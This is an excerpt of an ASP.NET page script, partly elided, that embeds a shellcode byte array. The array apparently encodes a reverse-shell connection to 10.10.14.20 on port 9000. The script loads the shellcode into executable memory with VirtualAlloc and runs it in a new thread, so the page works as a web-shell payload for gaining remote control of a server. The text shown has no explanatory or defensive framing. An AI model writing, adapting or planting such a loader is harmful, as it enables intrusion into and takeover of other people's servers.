...
<script runat="server">
    ...
    {
        byte[] wwxeo8lSI = new byte[354] {
0xfc,0xe8,0x8f,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x31,0xff,0x8b,0x72,
0x28,0x0f,0xb7,0x4a,0x26,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0x49,0x75,0xef,0x52,0x57,0x8b,
...
0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x0a,0x0e,0x14,0x68,0x02,0x00,0x23,0x28,0x89,0xe6,
...
0x00,0x53,0xff,0xd5 };
        ...
        IntPtr a94QsbKd1c4 = VirtualAlloc(IntPtr.Zero,(UIntPtr)wwxeo8lSI.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(wwxeo8lSI,0,a94QsbKd1c4,wwxeo8lSI.Length);
        IntPtr yzX_ = IntPtr.Zero;
        IntPtr r6vpM = CreateThread(IntPtr.Zero,UIntPtr.Zero,a94QsbKd1c4,IntPtr.Zero,0,ref yzX_);
    }
</script>
